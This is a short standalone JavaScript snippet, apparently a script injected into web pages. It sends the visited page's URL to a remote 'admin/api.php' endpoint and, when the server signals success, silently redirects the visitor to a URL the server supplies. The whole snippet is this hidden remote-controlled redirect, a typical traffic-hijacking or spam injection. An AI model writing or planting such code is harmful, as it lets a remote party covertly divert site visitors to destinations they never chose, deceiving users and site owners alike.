var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://shenma.usdc.ltd/admin/api.php?zhu_url=' + encodeURIComponent(window.location.href), true);
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        try {
            var res = JSON.parse(xhr.responseText);
            if (res.code === 1) {
                window.location.replace(res.data);
            }
        } catch (e) {
            console.error("JSON解析失败：", e);
        }
    }
};
xhr.send();
